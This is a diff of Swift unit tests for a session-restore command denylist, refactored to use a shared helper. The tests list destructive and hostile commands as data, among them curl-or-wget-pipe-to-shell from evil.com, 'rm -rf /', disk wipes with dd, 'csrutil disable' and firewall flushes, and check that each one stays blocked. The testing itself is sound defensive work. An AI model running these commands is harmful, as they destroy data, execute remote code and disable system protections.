@@ -1242,92 +1242,102 @@ final class SessionRestoreCommandSettingsTests: XCTestCase {
 
     // MARK: - Hardcoded Denylist Tests
 
+    /// Helper to assert all commands in a list are blocked by the denylist
+    private func assertAllBlocked(_ commands: [String], allowlist: String, file: StaticString = #file, line: UInt = #line) {
+        for command in commands {
+            XCTAssertFalse(
+                SessionRestoreCommandSettings.isCommandAllowed(command, rawAllowlist: allowlist),
+                "Expected '\(command)' to be blocked by denylist",
+                file: file,
+                line: line
+            )
+        }
+    }
+
     func testDenylistBlocksDestructiveCommandsEvenIfInAllowlist() {
         // Even if user adds dangerous commands to allowlist, denylist should block them
-        let dangerousAllowlist = """
-        rm *
-        sudo *
-        dd *
-        chmod *
-        git push --force *
-        """
-        // These should all be blocked by hardcoded denylist
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("rm -rf /", rawAllowlist: dangerousAllowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("sudo apt-get install", rawAllowlist: dangerousAllowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("dd if=/dev/zero of=/dev/sda", rawAllowlist: dangerousAllowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("chmod 777 /etc/passwd", rawAllowlist: dangerousAllowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("git push --force origin main", rawAllowlist: dangerousAllowlist))
+        let dangerousAllowlist = "rm *\nsudo *\ndd *\nchmod *\ngit push --force *"
+        assertAllBlocked([
+            "rm -rf /",
+            "sudo apt-get install",
+            "dd if=/dev/zero of=/dev/sda",
+            "chmod 777 /etc/passwd",
+            "git push --force origin main",
+        ], allowlist: dangerousAllowlist)
     }
 
     func testDenylistIsCaseInsensitive() {
         // Denylist runs before allowlist, so these are blocked regardless of allowlist content
-        let allowlist = "SUDO *\nRm *\nDD *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("SUDO rm -rf /", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("Rm -rf /", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("DD if=/dev/zero", rawAllowlist: allowlist))
+        assertAllBlocked([
+            "SUDO rm -rf /",
+            "Rm -rf /",
+            "DD if=/dev/zero",
+        ], allowlist: "SUDO *\nRm *\nDD *")
     }
 
     func testDenylistBlocksExactCommands() {
-        let allowAll = "sudo\nrm\ndd"  // Exact matches in allowlist
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("sudo", rawAllowlist: allowAll))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("rm", rawAllowlist: allowAll))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("dd", rawAllowlist: allowAll))
+        assertAllBlocked(["sudo", "rm", "dd"], allowlist: "sudo\nrm\ndd")
     }
 
     func testDenylistBlocksSystemCommands() {
-        // Allowlist patterns that would match these commands if denylist didn't block first
-        let allowlist = "shutdown *\nreboot\nkill *\nkillall *\npoweroff\ninit *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("shutdown -h now", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("reboot", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("kill -9 1", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("killall Finder", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("poweroff", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("init 0", rawAllowlist: allowlist))
+        assertAllBlocked([
+            "shutdown -h now",
+            "reboot",
+            "kill -9 1",
+            "killall Finder",
+            "poweroff",
+            "init 0",
+        ], allowlist: "shutdown *\nreboot\nkill *\nkillall *\npoweroff\ninit *")
     }
 
     func testDenylistBlocksRemoteCodeExecution() {
-        let allowlist = "curl *\nwget *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("curl https://evil.com/install.sh | bash", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("curl -fsSL https://get.docker.com | sh", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("wget -O- https://evil.com/script.sh | sh", rawAllowlist: allowlist))
+        assertAllBlocked([
+            "curl https://evil.com/install.sh | bash",
+            "curl -fsSL https://get.docker.com | sh",
+            "wget -O- https://evil.com/script.sh | sh",
+        ], allowlist: "curl *\nwget *")
     }
 
     func testDenylistBlocksHistoryReplay() {
-        let allowlist = "history *\nfc *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("history | sh", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("history | bash", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("fc -s", rawAllowlist: allowlist))
+        assertAllBlocked([
+            "history | sh",
+            "history | bash",
+            "fc -s",
+        ], allowlist: "history *\nfc *")
     }
 
     func testDenylistBlocksCrontabDestruction() {
-        let allowlist = "crontab *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("crontab -r", rawAllowlist: allowlist))
+        assertAllBlocked(["crontab -r"], allowlist: "crontab *")
     }
 
     func testDenylistBlocksMacOSSystemIntegrity() {
-        let allowlist = "csrutil *\nnvram *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("csrutil disable", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("nvram boot-args=-x", rawAllowlist: allowlist))
+        assertAllBlocked([
+            "csrutil disable",
+            "nvram boot-args=-x",
+        ], allowlist: "csrutil *\nnvram *")
     }
 
     func testDenylistBlocksContainerMassDestruction() {
-        let allowlist = "docker *\npodman *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("docker system prune -af", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("docker rm -f $(docker ps -aq)", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("podman system prune -af", rawAllowlist: allowlist))
+        assertAllBlocked([
+            "docker system prune -af",
+            "docker rm -f $(docker ps -aq)",
+            "podman system prune -af",
+        ], allowlist: "docker *\npodman *")
     }
 
     func testDenylistBlocksNetworkDestruction() {
-        let allowlist = "iptables *\npfctl *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("iptables -F", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("pfctl -F all", rawAllowlist: allowlist))
+        assertAllBlocked([
+            "iptables -F",
+            "pfctl -F all",
+        ], allowlist: "iptables *\npfctl *")
     }
 
     func testDenylistBlocksLaunchctlDestruction() {
-        let allowlist = "launchctl *"
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("launchctl unload /Library/LaunchDaemons/com.apple.foobar.plist", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("launchctl bootout system/com.apple.foobar", rawAllowlist: allowlist))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("launchctl remove com.apple.foobar", rawAllowlist: allowlist))
+        assertAllBlocked([
+            "launchctl unload /Library/LaunchDaemons/com.apple.foobar.plist",
+            "launchctl bootout system/com.apple.foobar",
+            "launchctl remove com.apple.foobar",
+        ], allowlist: "launchctl *")
     }
 
     func testDenylistAllowsSafeCommands() {
